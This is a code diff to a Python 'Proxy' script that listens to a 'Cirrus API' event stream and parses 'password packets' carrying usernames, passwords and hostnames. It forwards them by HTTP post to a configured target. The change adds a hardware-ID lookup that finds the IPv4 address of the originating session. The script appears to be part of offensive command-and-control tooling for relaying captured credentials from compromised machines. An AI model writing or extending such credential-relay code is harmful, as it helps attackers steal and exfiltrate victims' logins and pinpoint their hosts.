@@ -31,6 +31,11 @@ IGNORE_USER = ""
 IGNORE_PASSWORD = ""
 
 
+def _handle_socket_error(err):
+    print(f"websocket error: {err}", file=stderr)
+    exit(1)
+
+
 class Proxy(Api):
     __slots__ = ("_id", "_file", "_target")
 
@@ -43,7 +48,27 @@ class Proxy(Api):
             self._file = expanduser(expandvars(file))
 
     def start(self):
-        self.start_events(self._on_event)
+        self.start_events(self._on_event, on_error=_handle_socket_error)
+
+    def _get_hwid_ip(self, m):
+        v = "".join([hex(i)[2:].zfill(2) for i in m]).upper()
+        try:
+            for i in self.sessions(hw=v):
+                n = i["session"]["device"]["network"]
+                if len(n) == 0:
+                    continue
+                for v in n:
+                    if "ip" not in v or len(v["ip"]) == 0:
+                        continue
+                    for a in v["ip"]:
+                        if len(a) == 0 or ":" in a or "." not in a:
+                            continue
+                        return a
+                del n
+        except ValueError:
+            pass
+        del v
+        return str()
 
     def _read_packet(self, n):
         try:
@@ -60,8 +85,8 @@ class Proxy(Api):
             return print(f'Packet "{n}" was empty, skipping!', file=stderr)
         try:
             r = Reader(BytesIO(d))
-            u, p, w = r.read_str(), r.read_str(), ""
-            r.r.read(41)  # Skip ID, PID, PPID
+            u, p, w, m = r.read_str(), r.read_str(), "", r.r.read(28)  # Hardware ID
+            r.r.read(13)  # Skip RID, PID, PPID
             r.read_str()  # user
             r.read_str()  # version
             h = r.read_str()  # hostname
@@ -86,6 +111,10 @@ class Proxy(Api):
             return
         if nes(IGNORE_USER) and u.startswith(IGNORE_USER) and p == IGNORE_PASSWORD:
             return print(f'Skiping well known combo "{u}" / "{p}".', file=stderr)
+        if not nes(w) and len(m) > 0:
+            # Lookup by hardware ID.
+            w = self._get_hwid_ip(m)
+        del m
         try:
             if nes(self._target):
                 post(
@@ -137,7 +166,7 @@ if __name__ == "__main__":
         "-a", "--api", dest="api", type=str, required=True, help="Cirrus API Target"
     )
     a.add_argument(
-        "-p", "--password", dest="pass", type=str, help="Cirrus API Password"
+        "-p", "--password", dest="password", type=str, help="Cirrus API Password"
     )
     a.add_argument(
         "-i", "--id", dest="id", type=int, default=77, help="Password Packet ID"
